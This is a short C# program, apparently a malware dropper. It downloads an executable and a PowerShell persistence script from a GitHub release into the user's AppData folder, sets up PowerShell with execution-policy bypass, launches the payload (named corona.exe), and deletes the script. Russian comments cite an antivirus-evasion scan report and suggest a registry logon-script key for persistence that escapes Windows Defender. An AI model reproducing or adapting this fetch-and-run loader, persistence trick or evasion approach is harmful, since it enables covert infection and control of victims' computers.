using System;
using System.Net;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Security.Principal;
namespace DemoApplication

{
    public class Program
    {
        public static void Main()
        {
            var process = new Process();
            string url = "https://github.com/limercoder/USB_KEY/releases/download/BACK/main.exe";
            string PersFile = "https://github.com/limercoder/USB_KEY/releases/download/ZE.1/persistence.ps1";
            string Path = @"C:\Users\jonny\AppData\Roaming\persistence.ps";
            string savePath = @"C:\Users\jonny\AppData\Roaming\corona.exe";
            WebClient client = new WebClient();
            client.DownloadFile(url, savePath);
            client.DownloadFile(PersFile, Path);
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = $"-ExecutionPolicy Bypass -File C:\\Users\\jonny\\AppData\\Roaming\\persistence.ps";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.FileName = savePath;
            process.Start();
            process.Start();
            File.Delete(Path);
            //https://antiscan.me/scan/new/result?id=LwbiBVfFo5Ls репорт на детект
            // RegistryKey key = Registry.CurrentUser.CreateSubKey("Environment");
            // key.SetValue("UserInitMprLogonScript", "C:\Users\jonny\AppData\Roaming\corona.exe", RegistryValueKind.String); Еще один неплохой способ постоянства без обнаружения windef
            //На моем win 11 не работает уже, думаю будет работать на версиях младше 



        }
    }
}